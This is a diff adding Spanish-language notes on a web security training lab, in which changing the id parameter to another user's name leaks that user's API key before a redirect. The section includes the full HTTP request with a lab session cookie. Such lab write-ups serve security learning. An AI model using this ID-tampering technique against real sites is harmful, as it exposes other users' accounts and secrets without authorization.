@@ -163,7 +163,35 @@ Connection: close
 
 ```
 
+# User ID controlled by request parameter with data leakage in redirect
 
+Para este lab se cambia en la peticion get de usuario al usuario carlos y antes de redireccionar la pagina muestra el API key de este usuario
+siempre fijase que en las redirecciones no exista informacion valiosa asi como intentar renderizar la paginas para ver que es lo que se
+anda enviando.
+
+
+```
+GET /my-account?id=carlos HTTP/1.1
+Host: 0a900053030290c0c0636add0051009a.web-security-academy.net
+Cookie: session=XsJHeU3AAqiASZSXkY1qcyiieCOpCI3T
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a900053030290c0c0636add0051009a.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+
+
+
+```
 
 
 
